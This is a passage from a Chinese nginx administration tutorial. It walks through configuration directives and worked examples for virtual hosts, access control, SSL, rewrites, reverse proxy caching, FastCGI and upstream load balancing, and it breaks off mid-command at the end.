错误日志文件安装位置--http-log-path=/var/log/nginx/access.log 访问日志文件安装位置--pid-path=/var/run/nginx.pid 指明pid文件安装位置--lock-path=/var/run/nginx.lock 锁文件安装位置--http-client-body-temp-path=/var/cache/nginx/client_temp \#客户端body部分的临时文件存放路径，服务器允许客户端使用put方法提交大数据时，临时存放的磁盘路径--http-proxy-temp-path=/var/cache/nginx/proxy_temp \#作为代理服务器，服务器响应报文的临时文件存放路径--http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp \#作为fastcgi代理服务器，服务器响应报文的临时文件存放路径--http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp \#作为uwsgi代理服务器，服务器响应报文的临时文件存放路径--http-scgi-temp-path=/var/cache/nginx/scgi_temp \#作为scgi反代服务器，服务器响应报文的临时文件存放路径--user=nginx 指明以那个身份运行worker进程，主控master进程一般由root运行--group=nginx--with-http_ssl_module 表示把指定模块编译进来 nginx主配置段帮助文档：http://nginx.org/en/docs/ngx_core_module.html 正常运行必备的配置 user：指定worker进程的运行身份，如组不指定，默认和用户名同名 pid /PATH/TO/PID_FILE：指定存储nginx主进程PID的文件路径 include file|mask：指明包含进来的其它配置文件片断 load_module file： 模块加载配置文件：/usr/share/nginx/modules/*.conf 指明要装载的动态模块路径：/usr/lib64/nginx/modules/*.so 优化性能相关的配置 worker_processes number | auto：worker进程的数量；通常应该为当前主机的cpu的物理核心数 worker_cpu_affinity cpumask …：将worker进程绑定到指定CPU上，提高缓存命中率 12345cpumask: 00000001：0号CPU 00000010：1号CPU 10000000：8号CPUworker_cpu_affinity 0001 0010 0100 1000; 分别将worker进程绑定到1,2,3,4号CPU上 worker_priority number：指定worker进程的nice值，设定worker进程优先级：[-20-19] worker_rlimit_nofile number：worker进程所能够打开的文件数量上限 用于调试及定位问题相关的配置 daemon on|off：是否以守护进程方式运行nignx，默认是守护进程方式 master_process on|off：是否以master/worker模型运行nginx；默认为on；off 将不启动worker error_log file [level] ：错误日志文件及其级别；出于调试需要，可设定为debug；但debug仅在编译时使用了“–with-debug”选项时才有效：level:debug|info|notice|warn|error|crit|alter|emerg 事件驱动相关的配置123events &#123; worker_connections 1024;&#125; worker_connections number：每个worker进程所能够打开的最大并发连接数数量；总最大并发数：worker_processes * worker_connections use method：指明并发连接请求的处理方法，默认自动选择最优方法：use epoll; accept_mutex on|off：处理新的连接请求的方法；on指由各个worker轮流处理新请求，Off指每个新请求的到达都会通知(唤醒)所有的worker进程，但只有一个进程可获得连接，会造成“惊群”，影响服务器性能，建议开启 nginx的模块nginx高度模块化，但其模块早期不支持DSO机制；1.9.11版本支持动态装载和卸载 核心模块：core module 标准模块： HTTP 模块：ngx_http_* Mail 模块 ngx_mail_* Stream 模块 ngx_stream_* 第三方模块： ngx_http_core_module 核心模块1）server { … }：配置虚拟主机 12345678910111213141516]# vim /etc/nginx/nginx.confhttp &#123; server &#123; listen 80; server_name www.fenghong.tech; root /data/www/; &#125; server &#123; listen 80; server_name news.fenghong.tech; root /data/news/; &#125;&#125;]# nginx 启动服务]# echo news site &gt; /data/news/index.html]# echo www site &gt; /data/www/index.html 客户端测试： 1234]# curl www.fenghong.techwww site]# curl news.fenghong.technews site 2）listen port|address[:port]|unix:/PATH/TO/SOCKET_FILE 1listen address[:port] [default_server] [ssl] [http2 | spdy] [backlog=number] [rcvbuf=size] [sndbuf=size] default_server：设定为默认虚拟主机 ssl：限制仅能够通过ssl连接提供服务 backlog=number：超过并发连接数后，新请求进入后援队列的长 rcvbuf=size：接收缓冲区大小 sndbuf=size：发送缓冲区大小 listen PORT; 指令监听在不同的端口，可实现基于端口的虚拟主机 listen IP:PORT; 监听 IP 地址不同，实现基于IP的虚拟主机 3）server_name name … 虚拟主机的主机名称后可跟多个由空白字符分隔的字符串 支持*通配任意长度的任意字符 123456789 server &#123; listen 80; server_name *.fenghong.tech; root /data/default/; &#125;]# echo default &gt; /data/default/index.html]# nginx -s reload]# curl xxx.fenghong.techdefault 支持 ~ 起始的字符做正则表达式模式匹配，性能原因慎用 1server_name ~^www\d+\.fenghong\.tech$ #说明：\d 表示 [0-9] 匹配优先级机制从高到低：(1) 首先是字符串精确匹配 如：www.fenghong.com(2) 左侧*通配符 如：*.fenghong.tech(3) 右侧*通配符 如：www.fenghong.\(4) 正则表达式 如： ~^.\.fenghong\.tech$(5) default_server 4）tcp_nodelay on|off 在keepalived模式下的连接是否启用TCP_NODELAY选项 当为off时，延迟发送，合并多个请求后再发送 默认on时，不延迟发送 可用于：http, server, location 如果为了节约服务器性能可以打开，如果为了用户体验更好选择关闭 5）sendfile on|off 是否启用sendfile功能，在内核中封装报文直接发送，默认关闭 6）server_tokens on|off|build|string 是否在响应报文的Server首部显示nginx版本，建议关闭 7）root 设置web资源的路径映射；用于指明请求的URL所对应的文档的目录路径，可用于http, server, location, if in location 8）location [ = | ~ | ~* | ^~ ] uri { … } 在一个server中location配置段可存在多个，用于实现从uri到文件系统的路径映射；ngnix会根据用户请求的URI来检查定义的所有location，并找出一个最佳匹配，而后应用其配置 12345678910111213# mkdir /data/www/blog/# echo blog &gt; /data/www/blog/index.html# vim /etc/nginx/nginx.conf server &#123; listen 80; server_name www.fenghong.tech; root /data/www/; location /blog &#123; root /data/www/; &#125; &#125;# curl http://www.fenghong.tech/blog/ #测试blog =：对URI做精确匹配 ^~： 对URI的最左边部分做匹配检查，不区分字符大小写 ~： 对URI做正则表达式模式匹配，区分字符大小写 ~*： 对URI做正则表达式模式匹配，不区分字符大小写 不带符号：匹配起始于此uri的所有的uri 匹配优先级从高到低：=, ^~, ～/～*, 不带符号 例如： 123456789101112131415161718192021location = / &#123; [ configuration A ]&#125;location / &#123; [ configuration B ]&#125;location /documents/ &#123; [ configuration C ]&#125;location ^~ /images/ &#123; [ configuration D ]&#125;location ~* \.(gif|jpg|jpeg)$ &#123; [ configuration E ]&#125;The “/” request will match configuration A, the “/index.html” request will match configuration B, the “/documents/document.html” request will match configuration C, the “/images/1.gif” request will match configuration D, and the “/documents/1.jpg” request will match configuration E. 9）alias 路径别名，文档映射的另一种机制；仅能用于location上下文 12345678910 server &#123; listen 80; server_name www.fenghong.tech; root /data/www/; location /blog &#123; alias /data/www/blog; #和root /data/www/;作用相同 &#125; &#125;# curl http://www.fenghong.tech/blog/blog 注意：location中使用root指令和alias指令的意义不同(a) root，给定的路径对应于location中的/uri/左侧的/(b) alias，给定的路径对应于location中的/uri/右侧的/ 10）index file … 指定默认网页文件，注意需要装载 ngx_http_index_module 模块 11）error_page code … [=[response]] uri 定义错误页，以指定的响应状态码进行响应；可用位置：http, server, location, if in location 123456789# echo &quot;404 not found page&quot; &gt; /data/www/404.html server &#123; listen 80; server_name www.fenghong.tech; root /data/www/; error_page 404 /404.html; &#125;# curl http://www.fenghong.tech/notfound.html404 not found page 12345678 server &#123; listen 80; server_name www.fenghong.tech; root /data/www/; error_page 404 =200 /404.html; #将404返回码重定向成200访问码，防止浏览器劫持 &#125;# curl -I http://www.fenghong.tech/notfound.htmlHTTP/1.1 200 OK #测试为200正确访问码 12）try_files file … uri | =code ​ 按顺序检查文件是否存在，返回第一个找到的文件或文件夹（结尾加斜线表示为文件夹），如果所有的文件或文件夹都找不到，会进行一个内部重定向到最后一个参数。只有最后一个参数可以引起一个内部重定向，之前的参数只设置内部URI的指向。最后一个参数是回退URI且必须存在，否则会出现内部500错误 12345678910111213# echo default page &gt; /data/news/default.html server &#123; listen 80; server_name news.fenghong.tech; root /data/news/; location / &#123; try_files $uri /default.html; #如果用户访问的URI不存在则放回默认页面 &#125; &#125;# curl http://news.fenghong.tech/index.html news site# curl http://news.fenghong.tech/noindex.htmldefault page 123456789101112 server &#123; listen 80; server_name news.fenghong.tech; root /data/news/; location / &#123; try_files $uri $uri/index.html $uri.html =404; &#125; &#125;# curl http://news.fenghong.tech/index.html news site# curl http://news.fenghong.tech/noindex.html404 Not Found 13）keepalive_timeout timeout [header_timeout] 设定保持连接超时时长，0表示禁止长连接，默认为75s，可用于http, server, location 14）keepalive_requests number 在一次长连接上所允许请求的资源的最大数量，默认为100 15）keepalive_disable none | browser … 对哪类型的浏览器禁用长连接 16）send_timeout time 向客户端发送响应报文的超时时长，此处是指两次写操作之间的间隔时长，而非整个响应过程的传输时长 17）client_body_buffer_size size 用于接收每个客户端请求报文的body部分的缓冲区大小；默认为16k； 超出此大小时，其将被暂存到磁盘上的由下面 client_body_temp_path 指令所定义的位置 18）client_body_temp_path path [level1 [level2 [level3]]] 设定存储客户端请求报文的body部分的临时存储路径及子目录结构和数量 19）limit_rate rate 限制响应给客户端的传输速率，单位是bytes/second；默认值0表示无限制 20）limit_except method … { … } 限制客户端使用除了指定的请求方法之外的其它方法，仅用于location method:GET(包括HEAD), HEAD, POST, PUT, DELETE, MKCOL, COPY, MOVE, OPTIONS, PROPFIND, PROPPATCH, LOCK, UNLOCK, PATCH 12345678location /upload &#123; root /date/www/; limit_except GAT &#123; allow 192.168.0.9/24; deny all; &#125;&#125;# 除了 GET和HEAD 之外其它方法仅允许192.168.0.9/24主机使用 21）aio on | off | threads[=pool] 是否启用aio功能 22）directio size | off 当文件大于等于给定大小时，例如directio 4m，同步到磁盘，而非写缓存，以防数据丢失 23）open_file_cache off | max=N [inactive=time] max=N：可缓存的缓存项上限；达到上限后会使用LRU算法实现管理 inactive=time：缓存项的非活动时长，在此处指定的时长内未被命中的或命中的次数少于open_file_cache_min_uses指令所指定的次数的缓存项即为非活动项将被删除 24）open_file_cache_errors on | off 是否缓存查找时发生错误的文件一类的信息，默认值为off 25）open_file_cache_min_uses number open_file_cache指令的inactive参数指定的时长内，至少被命中此处指定的次数方可被归类为活动项，默认值为1 26）open_file_cache_valid time 缓存项有效性的检查频率，默认值为60s ngx_http_access_module 访问控制模块基于ip的访问控制功能 123456789server &#123; listen 80 default_server; server_name www.fenghong.tech; root /data/www/; location / &#123; allow 192.168.0.0/24; deny all; &#125;&#125; 自上而下检查，一旦匹配，将生效，条件严格的置前 ngx_http_auth_basic_module 用户认证模块实现基于用户的访问控制，使用basic机制进行用户认证 12345678910111213141516# mkdir /data/www/admin/# echo admin area &gt; /data/www/admin/index.html server &#123; listen 80 default_server; server_name www.fenghong.tech; root /data/www/; location /admin &#123; auth_basic &quot;Admin Area&quot;; auth_basic_user_file /etc/nginx/.ngxpasswd; &#125; &#125;# yum install httpd-tools -y# htpasswd -cm /etc/nginx/.ngxpasswd user1# htpasswd -m /etc/nginx/.ngxpasswd user2# nginx -s reload浏览器访问：http://192.168.0.8/admin/ 测试 ngx_http_stub_status_module 服务器状态信息模块用于输出nginx的基本状态信息 1234567891011121314server &#123; listen 80 default_server; server_name www.fenghong.tech; root /data/www/; location /admin &#123; auth_basic &quot;Admin Area&quot;; auth_basic_user_file /etc/nginx/.ngxpasswd; &#125; location /status &#123; stub_status; allow 192.168.0.0/24; deny all; &#125;&#125; 12345]# curl http://192.168.0.8/status/Active connections: 3 server accepts handled requests 35 35 34Reading: 0 Writing: 1 Waiting: 2 Active connections：当前状态，活动状态的连接数accepts：统计总值，已经接受的客户端请求的总数handled：统计总值，已经处理完成的客户端请求的总数requests：统计总值，客户端发来的总的请求数Reading：当前状态，正在读取客户端请求报文首部的连接的连接数Writing：当前状态，正在向客户端发送响应报文过程中的连接数Waiting：当前状态，正在等待客户端发出请求的空闲连接数 ngx_http_log_module 日志模块指定日志格式记录请求 1）log_format name string … string可以使用nginx核心模块及其它模块内嵌的变量 2）access_log path [format [buffer=size][gzip[=level]][flush=time][if=condition]] 或 access_log off 1234567891011http &#123; log_format customlog &apos;$remote_addr - $remote_user [$time_iso8601] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; server &#123; listen 80 default_server; server_name www.fenghong.tech; root /data/www/; access_log /var/log/nginx/www.fenghong.tech-access.log customlog buffer=32k; &#125;&#125; 3）open_log_file_cache max=N [inactive=time][min_uses=N][valid=time]; 和 open_log_file_cache off; 缓存各日志文件相关的元数据信息 max：缓存的最大文件描述符数量min_uses：在inactive指定的时长内访问大于等于此值方可被当作活动项inactive：非活动时长valid：验证缓存中各缓存项是否为活动项的时间间隔 ngx_http_gzip_module 压缩传输模块用gzip方法压缩响应数据，节约带宽 1）gzip on | off; 启用或禁用gzip压缩 2）gzip_comp_level level; 压缩比由低到高：1 到 9 ，默认：1 3）gzip_disable regex …; 匹配到客户端浏览器不执行压缩 4）gzip_min_length length; 启用压缩功能的响应报文大小阈值 5）gzip_http_version 1.0 | 1.1; 设定启用压缩功能时，协议的最小版本，默认：1.1 6）gzip_buffers number size; 支持实现压缩功能时缓冲区数量及每个缓存区的大小，默认：32 4k 或 16 8k 7）gzip_types mime-type …; 指明仅对哪些类型的资源执行压缩操作；即压缩过滤器，默认包含有text/html，不用显示指定，否则出错 8）gzip_vary on | off; 如果启用压缩，是否在响应报文首部插入“Vary: Accept-Encoding” 9）gzip_proxied off | expired | no-cache | no-store | private | no_last_modified | no_etag | auth | any …; nginx充当代理服务器时，对于后端服务器的响应报文，在何种条件下启用压缩功能 off：不启用压缩 expired，no-cache, no-store，private：对后端服务器的响应报文首部Cache-Control值任何一个，启用压缩功能 12345678910server &#123; listen 80 default_server; server_name www.fenghong.tech; root /data/www/; gzip on; gzip_comp_level 6; gzip_min_length 64; gzip_proxied any; gzip_types text/xml text/css text/plain application/javascript;&#125; ngx_http_ssl_module 加密传输模块1）ssl on|off; 为指定虚拟机启用HTTPS protocol， 建议用listen指令代替 2）ssl_certificate file; 当前虚拟主机使用PEM格式的证书文件 3）ssl_certificate_key file; 当前虚拟主机上与其证书匹配的私钥文件 4）ssl_protocols [SSLv2][SSLv3][TLSv1][TLSv1.1][TLSv1.2]; 支持ssl协议版本，默认为后三个 5）ssl_session_cache off | none | [builtin[:size]][shared:name:size]; none: 通知客户端支持ssl session cache，但实际不支持 builtin[:size]：使用OpenSSL内建缓存，为每worker进程私有 [shared:name:size]：在各worker之间使用一个共享的缓存 6）ssl_session_timeout time; 客户端连接可以复用ssl session cache中缓存的ssl参数的有效时长，默认5m 服务器配置示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344[root@nginx ~]# cd /etc/pki/tls/certs/[root@nginx certs]# vim Makefile%.key: umask 77 ; \ /usr/bin/openssl genrsa $(KEYLEN) &gt; $@[root@nginx certs]# make aa.crtCountry Name (2 letter code) [XX]:CNState or Province Name (full name) []:bjLocality Name (eg, city) [Default City]:bjOrganization Name (eg, company) [Default Company Ltd]:aa.comOrganizational Unit Name (eg, section) []:optCommon Name (eg, your name or your server&apos;s hostname) []:www.aa.com[root@nginx certs]# make bb.crtCountry Name (2 letter code) [XX]:CNState or Province Name (full name) []:bjLocality Name (eg, city) [Default City]:bjOrganization Name (eg, company) [Default Company Ltd]:bb.comOrganizational Unit Name (eg, section) []:optCommon Name (eg, your name or your server&apos;s hostname) []:www.bb.com[root@nginx certs]# mkdir /etc/nginx/conf.d/ssl/[root@nginx certs]# mv aa.crt aa.key bb.crt bb.key /etc/nginx/conf.d/ssl/[root@nginx ~]# vim /etc/nginx/conf.d/vhosts.confserver &#123; listen 443 ssl; server_name www.aa.com; root /data/www/aa/; ssl_certificate /etc/nginx/conf.d/ssl/aa.crt; ssl_certificate_key /etc/nginx/conf.d/ssl/aa.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m;&#125;server &#123; listen 443 ssl; server_name www.bb.com; root /data/www/bb/; ssl_certificate /etc/nginx/conf.d/ssl/bb.crt; ssl_certificate_key /etc/nginx/conf.d/ssl/bb.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m;&#125;[root@nginx ~]# mkdir -pv /data/www/&#123;aa,bb&#125;[root@nginx ~]# echo &quot;aa test page&quot; &gt; /data/www/aa/index.html[root@nginx ~]# echo &quot;bb test page&quot; &gt; /data/www/bb/index.html[root@nginx ~]# nginx 客户端测试： 123456[root@client ~]# vim /etc/hosts192.168.0.8 www.aa.com www.bb.com[root@client ~]# curl -k https://www.aa.com/aa test page[root@client ~]# curl -k https://www.bb.com/bb test page ngx_http_rewrite_module URI重写模块将用户请求的URI基于PCRE regex所描述的模式进行检查，而后完成重定向替换 1）rewrite regex replacement [flag] 将用户请求的URI基于regex所描述的模式进行检查，匹配到时将其替换为replacement指定的新的URI 如果在同一级配置块中存在多个rewrite规则，那么会自下而下逐个检查；被某条件规则替换完成后，会重新一轮的替换检查 隐含有循环机制,但不超过10次；如果超过，提示500响应码，[flag]所表示的标志位用于控制此循环机制 如果replacement是以http://或https://开头，则替换结果会直接以重向返回给客户端, 即永久重定向301 [flag]： last：重写完成后停止对当前URI在当前location中后续的其它重写操作，而后对新的URI启动新一轮重写检查；提前重启新一轮循环，不建议在location中使用 break：重写完成后停止对当前URI在当前location中后续的其它重写操作，而后直接跳转至重写规则配置块之后的其它配置；结束循环，建议在location中使用 redirect：临时重定向，重写完成后以临时重定向方式直接返回重写后生成的新URI给客户端，由客户端重新发起请求；使用相对路径,或者http://或https://开头，状态码：302 permanent:重写完成后以永久重定向方式直接返回重写后生成的新URI给客户端，由客户端重新发起请求，状态码：301 2）return return code [text]; return code URL; return URL; 停止处理，并返回给客户端指定的响应码 3）rewrite_log on | off; 是否开启重写日志, 发送至error_log（notice level） 4）set $variable value; 用户自定义变量；注意：变量定义和调用都要以$开头 5）if (condition) { … } 条件满足时，执行配置块中的配置指令；server, location condition： = 相同 != 不同 ~：模式匹配，区分字符大小写 ~*：模式匹配，不区分字符大小写 !~：模式不匹配，区分字符大小写 !~*：模式不匹配，不区分字符大小写 -e, !-e 存在（包括文件，目录，软链接） -f, !-f 文件 -d, !-d 目录 -x, !-x 执行 实现http重定向到https 123456789101112131415server &#123; listen 80 default_server; listen 443 ssl; server_name www.aa.com; root /data/www/aa; ssl_certificate /etc/nginx/conf.d/ssl/aa.crt; ssl_certificate_key /etc/nginx/conf.d/ssl/aa.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; location / &#123; if ( $scheme = http ) &#123; rewrite / https://www.aa.com/ redirect; &#125; &#125;&#125; ngx_http_referer_module 模块用来阻止Referer首部无有效值的请求访问，可防止盗链 valid_referers none|blocked|server_names|string …; 定义referer首部的合法可用值，不能匹配的将是非法值 none：请求报文首部没有referer首部 blocked：请求报文有referer首部，但无有效值 server_names：参数，其可以有值作为主机名或主机名模式 arbitrary_string：任意字符串，但可使用*作通配符 regular expression：被指定的正则表达式模式匹配到的字符串,要使用~开头，例如： ~.*\.fenghong\.com 1234567891011121314151617181920[root@nginx ~]# cp /usr/share/backgrounds/night.jpg /data/www/aa/[root@nginx ~]# vim /data/www/bb/index.htmlbb test page&lt;img src=http://www.aa.com/night.jpg&gt; #bb.com网站盗链aa.com网站图片[root@nginx ~]# vim /etc/nginx/conf.d/vhosts.confserver &#123; listen 80; server_name www.aa.com; root /data/www/aa; valid_referers none block server_names *.aa.com ~\.aa\.; #只有从aa.com访问的才可以浏览 if ($invalid_referer) &#123; return 403 http://www.aa.com; &#125;&#125;server &#123; listen 80; server_name www.bb.com; root /data/www/bb/;&#125;现在访问www.bb.com无法获取aa.com的图片了 ngx_http_proxy_module 反向代理模块反向代理：转发请求至另一台主机 1）proxy_pass URL; proxy_pass后面路径不带uri时，会将location的uri传递（附加）给后端主机 12345678server &#123; listen 80; server_name www.aa.com; location /admin &#123; proxy_pass http://192.168.0.9/; #带&quot; / &quot; &#125;&#125;访问http://www.aa.com时相当于访问 http://192.168.0.9/ 12345678server &#123; listen 80; server_name www.aa.com; location /admin &#123; proxy_pass http://192.168.0.9; #不带&quot; / &quot; &#125;&#125;访问http://www.aa.com时相当于访问 http://192.168.0.9/admin 如果location定义其uri时使用了正则表达式的模式，则proxy_pass之后必须不能使用uri; 用户请求时传递的uri将直接附加至后端服务器之后 2）proxy_set_header field value; 设定发往后端主机的请求报文的请求首部的值 12proxy_set_header X-Real-IP $remote_addr; #$remote_addr客户端IPproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #$proxy_add_x_forwarded_for代理IP 配合日志记录实现后端web服务器记录真正的客户端地址： 123456789[root@nginx ~]# vim /etc/nginx/conf.d/vhosts.confserver &#123; listen 80 default_server; server_name www.aa.com; location / &#123; proxy_pass http://192.168.0.9/; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125; 123456789101112131415[root@nginx-1 ~]# vim /etc/nginx/nginx.conflisten 80;listen [::]:80;log_format mylogformat &apos;$http_x_forwarded_for - $remote_user [$time_iso8601] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;[root@nginx-1 ~]# vim /etc/nginx/conf.d/vhosts.confserver &#123; listen 80 default_server; server_name www.aa.com; root /data/www/aa/; access_log /var/log/nginx/www.aa.com-access.log mylogformat;&#125;root@nginx-1 ~]# mkdir -pv /data/www/aa/[root@nginx-1 ~]# echo www.aa.com test page on nginx-1 &gt; /data/www/aa/index.html 1234[root@nginx-2 ~]# curl www.aa.comwww.aa.com test page on nginx-1[root@nginx-1 ~]# tail -f /var/log/nginx/www.aa.com-access.log192.168.0.10 - - [2018-07-07T14:34:07+08:00] &quot;GET / HTTP/1.0&quot; 200 32 &quot;-&quot; &quot;curl/7.29.0&quot; &quot;192.168.0.10&quot; #显示的是真正的客户端的IP地址 3）proxy_cache_path; 定义可用于proxy功能的缓存，在http中定义 1proxy_cache_path path [levels=levels] [use_temp_path=on|off] keys_zone=name:size [inactive=time] [max_size=size] [manager_files=number] [manager_sleep=time] [manager_threshold=time] [loader_files=number] [loader_sleep=time] [loader_threshold=time] [purger=on|off] [purger_files=number] [purger_sleep=time] [purger_threshold=time]; 配置代理缓存示例：在http配置定义缓存信息 123[root@nginx ~]# vim /etc/nginx/nginx.confproxy_cache_path /var/cache/nginx/proxy_cache levels=1:1:1 keys_zone=proxycache:20m inactive=120s max_size=1g;[root@nginx ~]# mkdir /var/cache/nginx/ proxycache:20m 指内存中缓存的大小，主要用于存放key和metadata max_size=1g 指磁盘存入文件内容的缓存空间最大值 12345678910111213141516171819[root@nginx ~]# vim /etc/nginx/conf.d/vhosts.confserver &#123; listen 80 default_server; server_name www.aa.com; location / &#123; proxy_pass http://192.168.0.9/; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_cache proxycache; proxy_cache_key $request_uri; proxy_cache_valid 200 302 301 1h; proxy_cache_valid any 1m; &#125;&#125;[root@nginx ~]# tree /var/cache/nginx/proxy_cache//var/cache/nginx/proxy_cache/└── 9 └── d └── 7 └── 6666cd76f96956469e7be39d750cc7d9 4）proxy_cache zone|off; 默认off ，指明调用的缓存，或关闭缓存机制 5）proxy_cache_key string; 缓存中用于“键”的内容 默认值：proxy_cache_key \$scheme\$proxy_host\$request_uri; 6）proxy_cache_valid [code …] time; 定义对特定响应码的响应内容的缓存时长，定义在http{…}中 7）proxy_cache_use_stale; 在被代理的后端服务器出现哪种情况下，可以真接使用过期的缓存响应客户端 1proxy_cache_use_stale error | timeout | invalid_header | updating | http_500 | http_502 | http_503 | http_504 | http_403 | http_404 | off ... 8）proxy_cache_methods GET | HEAD | POST …; 对哪些客户端请求方法对应的响应进行缓存，GET和HEAD方法总是被缓存 9）proxy_hide_header field; 默认nginx在响应报文不传递后端服务器的首部字段Date, Server, X-Pad, X-Accel-等，用于隐藏后端服务器特定的响应首部 10）proxy_connect_timeout time; 定义与后端服务器建立连接的超时时长，如超时会出现502错误，默认为60s，一般不建议超出75s 11）proxy_send_timeout time; 将请求发送给后端服务器的超时时长；默认为60s 12）proxy_read_timeout time; 等待后端服务器发送响应报文的超时时长，默认为60s ngx_http_headers_module 模块向由代理服务器响应给客户端的响应报文添加自定义首部，或修改指定首部的值 1）add_header name value [always]; 添加自定义首部 123add_header X-Via $server_addr;add_header X-Cache $upstream_cache_status;add_header X-Accel $server_name; 2）add_trailer name value [always]; 添加自定义响应信息的尾部 ngx_http_fastcgi_module 模块转发请求到FastCGI服务器，不支持php模块方式 1）fastcgi_pass address; address为后端的fastcgi server的地址；可用位置：location, if in location 2）fastcgi_index name; fastcgi默认的主页资源；fastcgi_index index.php; 3）fastcgi_param parameter value [if_not_empty]; 设置传递给 FastCGI服务器的参数值，可以是文本，变量或组合 4）fastcgi_cache_path path … 定义fastcgi的缓存： 1fastcgi_cache_path path [levels=levels] [use_temp_path=on|off] keys_zone=name:size [inactive=time] [max_size=size] [manager_files=number] [manager_sleep=time] [manager_threshold=time] [loader_files=number] [loader_sleep=time] [loader_threshold=time][purger=on|off] [purger_files=number] [purger_sleep=time] [purger_threshold=time]; path：缓存位置为磁盘上的文件系统max_size=size：磁盘path路径中用于缓存数据的缓存空间上限levels=levels：缓存目录的层级数量，以及每一级的目录数量levels=ONE:TWO:THREE：示例：leves=1:2:2keys_zone=name:size：k/v映射的内存空间的名称及大小inactive=time：非活动时长 5）fastcgi_cache zone|off; 调用指定的缓存空间来缓存数据，可用位置：http, server, location 6）fastcgi_cache_key string; 定义用作缓存项的key的字符串，示例：fastcgi_cache_key $request_rui; 7）fastcgi_cache_methods GET | HEAD | POST …; 为哪些请求方法使用缓存 8）fastcgi_cache_min_uses number; 缓存空间中的缓存项在inactive定义的非活动时间内至少要被访问到此处所指定的次数方可被认作活动项 9）fastcgi_keep_conn on | off; 收到后端服务器响应后，fastcgi服务器是否关闭连接，建议启用长连接 10）fastcgi_cache_valid [code …] time; 不同的响应码各自的缓存时长 示例：配置 lnmp 123456789101112131415161718192021222324252627282930313233343536373839[root@lnmp ~]# yum install nginx php-fpm php-mysql mariadb -y[root@lnmp ~]# cp /etc/nginx/nginx.conf&#123;,.bak&#125;[root@lnmp ~]# vim /etc/nginx/nginx.confhttp &#123; fastcgi_cache_path /var/cache/nginx/fcgi_cache levels=1:2:1 keys_zone=fcgicache:20m inactive=120s; server &#123; listen 80 default_server; server_name www.fenghong.tech; root /data/www; location / &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /data/www/$fastcgi_script_name; include fastcgi_params; fastcgi_cache fcgicache; fastcgi_cache_key $request_uri; fastcgi_cache_valid 200 302 10m; fastcgi_cache_valid 301 1h; fastcgi_cache_valid any 1m; &#125; location ~* ^/(status|ping)$ &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_param SCRIPT_FILENAME $fastcgi_script_name; include fastcgi_params; &#125; &#125;&#125;[root@lnmp ~]# vim /etc/php-fpm.d/www.confpm.status_path = /statusping.response = pongping.path = /ping[root@lnmp ~]# systemctl enable nginx.service php-fpm.service[root@lnmp ~]# systemctl start nginx.service php-fpm.service[root@lnmp ~]# mkdir /var/cache/nginx/[root@lnmp ~]# mkdir -pv /data/www/[root@lnmp ~]# vim /data/www/index.php&lt;?phpphpinfo();?&gt; 12345678910111213141516171819测试：# curl 192.168.0.8/status #查看PHP的工作状态pool: wwwprocess manager: dynamicstart time: 07/Jul/2018:16:27:07 +0800start since: 1463accepted conn: 9listen queue: 0max listen queue: 0listen queue len: 128idle processes: 4active processes: 1total processes: 5max active processes: 1max children reached: 0slow requests: 0# curl 192.168.0.8/ping #测试PHP进程是否工作pong访问 http://192.168.0.8/ ngx_http_upstream_module 反向代理调度模块用于将多个服务器定义成服务器组，而由proxy_pass, fastcgi_pass等指令进行引用，实现健康检查，负载均衡的功能 1）upstream name { … } 定义后端服务器组，会引入一个新的上下文，默认调度算法是wrr，在http中定义 2）server address [parameters]; 在upstream上下文中server成员，以及相关的参数 address： unix: /PATH/TO/SOME_SOCK_FILE socket文件 IP[:PORT] IP加端口 HOSTNAME[:PORT] 主机名加端口 parameters： weight=number 权重，默认为1 max_conns 连接后端报务器最大并发活动连接数，1.11.5版本后支持 max_fails=number 失败尝试最大次数；超出此处指定的次数时，server将被标记为不可用,默认为1 fail_timeout=time 后端服务器标记为不可用状态的连接超时时长，默认10s backup 将服务器标记为“备用”，即所有服务器均不可用时才启用 down 标记为“不可用”，配合ip_hash使用，实现灰度发布 3）ip_hash 源地址hash调度方法 4）least_conn 最少连接调度算法，当server拥有不同的权重时其为wlc，当所有后端主机连接数相同时，则使用wrr，适用于长连接 5）hash key [consistent] 基于指定的key的hash表来实现对请求的调度，此处的key可以直接文本、变量或二者组合 将请求分类，同一类请求将发往同一个upstream server，使用consistent参数，将使用ketama一致性hash算法，适用于后端是Cache服务器（如varnish）时使用 12hash $request_uri consistent;hash $remote_addr; 6）keepalive 连接数N：为每个worker进程保留的空闲的长连接数量,可节约nginx端口，并减少连接管理的消耗 7）health_check [parameters]; 健康状态检测机制；只能用于location上下文，仅对nginx plus有效 interval=time检测的频率，默认为5秒 fails=number：判定服务器不可用的失败检测次数；默认为1次 passes=number：判定服务器可用的失败检测次数；默认为1次 uri=uri：做健康状态检测测试的目标uri；默认为/ match=NAME：健康状态检测的结果评估调用此处指定的match配置块 8）match name { … } 对backend server做健康状态检测时，定义其结果判断机制；只能用于http上下文，仅对nginx plus有效 status code[ code …]: 期望的响应状态码 header HEADER[operator value]：期望存在响应首部，也可对期望的响应首部的值基于比较操作符和值进行比较 body：期望响应报文的主体部分应该有的内容 实现proxy反向代理的动静分离缓存负载均衡。 静态服务器的配置ip为192.168.1.13 1234567]# yum install -y httpd]# vim /etc/httpd/conf/httpd.confLogFormat \&quot;%&#123;X-Real-IP&#125;i\&quot; %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined]# echo static html &gt; /var/www/html/index.html]# cp /var/log/messages-20180610 /var/www/html/m.txt #生成大文件]# for i in 